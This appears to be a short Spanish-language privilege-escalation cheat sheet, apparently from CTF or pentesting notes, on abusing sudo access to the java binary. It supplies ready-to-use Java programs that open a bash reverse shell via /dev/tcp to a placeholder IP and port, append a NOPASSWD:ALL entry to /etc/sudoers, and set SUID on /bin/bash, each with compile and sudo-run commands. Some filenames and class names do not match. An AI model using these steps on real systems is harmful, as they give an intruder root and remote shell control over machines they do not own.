# Rev Shell
Crear el script /tmp/shell.java

```bash
import java.io.IOException;

public class shell {
    public static void main(String[] args) {
        try {
            // Comando para enviar una shell interactiva a 172.17.0.1 por el puerto 4444
            String cmd = "bash -i >& /dev/tcp/IP/PORT 0>&1";
            
            // Ejecutar el comando en la terminal
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
			
			// Esperar a que termine
            process.waitFor();
            
            System.out.println("Intento de establecer una shell reversa completado.");

        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```

luego compilar, para después poner en escucha:

```bash
javac archivo.java
```

ejecutar:

```bash
sudo -u USER java archivo
```
# Con archivo editado
Nombre del [archivo.java](http://archivo.java) (editar user)

```
public class E {
public static void main(String[] a)throws Exception {
   // Comando más simple
   Process p = Runtime.getRuntime().exec(new String[]{
       "sh", "-c", "echo USER ALL=\\(ALL\\) NOPASSWD:ALL >> /etc/sudoers"
   });
   int exitCode = p.waitFor();
   System.out.println("Completado. Código de salida: " + exitCode);
   }
}
```

Compilar y ejecutar 

```
javac E.java
sudo java E
```

Elevar con:

```bash
Sudo su 
```

## Cambiar SUID

```bash
import java.io.IOException;

public class SetSUID {
    public static void main(String[] args) {
        try {
            // Comando para dar permisos SUID a la /bin/bash
            String cmd = "chmod u+s /bin/bash";
            
            // Ejecutar el comando en la terminal
            Process process = Runtime.getRuntime().exec(new String[]{"/bin/bash", "-c", cmd});
            
            // Esperar a que termine
            process.waitFor();
            
            System.out.println("Intento de establecer SUID en /bin/bash completado.");
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```
Luego ejecutar
```
sudo /usr/bin/java SUID.java
```
